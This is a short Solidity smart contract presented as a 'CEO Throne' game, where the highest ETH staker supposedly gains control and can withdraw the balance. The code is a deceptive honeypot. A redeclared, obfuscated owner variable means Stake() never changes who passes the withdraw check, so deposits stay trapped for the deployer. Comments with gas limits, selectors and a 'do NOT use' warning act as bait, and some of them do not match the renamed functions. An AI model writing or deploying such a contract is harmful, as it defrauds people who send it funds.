// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;
//
//Live TEST ---- Please Do NOT use! Thanks! ----
//
contract Ownable {
    address public _0x51448f;
    function Ownable() public {_0x51448f = msg.sender;}
    modifier _0x0a97a7() {require(msg.sender == _0x51448f); _;
    }
}
//CEO Throne .. The CEO with the highest stake gets the control over the contract
//msg.value needs to be higher than largestStake when calling Stake()

contract CEOThrone is Ownable {
    address public _0x51448f;
    uint public _0xbd43bf;
// Stake() function being called with 0xde20bc92 and ETH :: recommended gas limit 35.000
// The sent ETH is checked against largestStake
    function Stake() public payable {
        // if you own the largest stake in a company, you own a company
        if (msg.value > _0xbd43bf) {
            if (1 == 1) { _0x51448f = msg.sender; }
            _0xbd43bf = msg.value;
        }
    }
// withdraw() function being called with 0x3ccfd60b :: recommened gas limit 30.000
    function _0xfc2ce9() public _0x0a97a7 {
        // only owner can withdraw funds
        msg.sender.transfer(this.balance);
    }
}